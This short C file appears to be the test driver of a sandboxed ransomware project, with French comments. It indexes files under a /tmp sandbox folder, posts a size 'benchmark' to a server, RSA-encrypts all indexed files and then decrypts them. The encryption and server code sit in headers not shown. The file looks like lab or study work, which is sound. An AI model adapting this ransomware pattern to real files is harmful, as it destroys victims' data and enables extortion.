#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/evp.h>

#include "../crypto_rsa.h"
#include "../files_finder.h"
#include "../benchmark.h"
#include "../server.h"

int main(int argc, char const *argv[])
{
    /* code */
    char* paths[] = {"/tmp/sandbox-ransomware/"};
    /* Initialisation de la structure pour la recherche de fichier */
    listFileData* p_listFileData = init_list_file_data();

    /* Indexation des fichiers à chiffrer */
    files_finder(p_listFileData, paths, 1);

    /* Affichage des fichiers indexés */
    //print_path_data(p_listFileData);

    /* Envoi du benchmark au serveur */
    benchmarkData* p_benchmarkData = benchmark_pc(p_listFileData->totalSize);
    post_benchmark("jsp", p_benchmarkData);

    /* Chargement public key */
    EVP_PKEY* p_pubKey = rsa_load_key("public.pem", OSSL_KEYMGMT_SELECT_PUBLIC_KEY);

    //printf("size of p_pubKey: %d\n", EVP_PKEY_size(p_pubKey));

    /* Chiffrement des fichiers */
    rsa_encrypt_files(p_listFileData, p_pubKey);

    EVP_PKEY_free(p_pubKey);

    /* Chargment private key */
    EVP_PKEY* p_privKey = rsa_load_key("private.pem", OSSL_KEYMGMT_SELECT_PRIVATE_KEY);

    /* Déchiffrement des fichiers */
    rsa_decrypt_files(p_listFileData, p_privKey);

    free_path_data(p_listFileData);

    EVP_PKEY_free(p_privKey);

    return EXIT_SUCCESS;
}
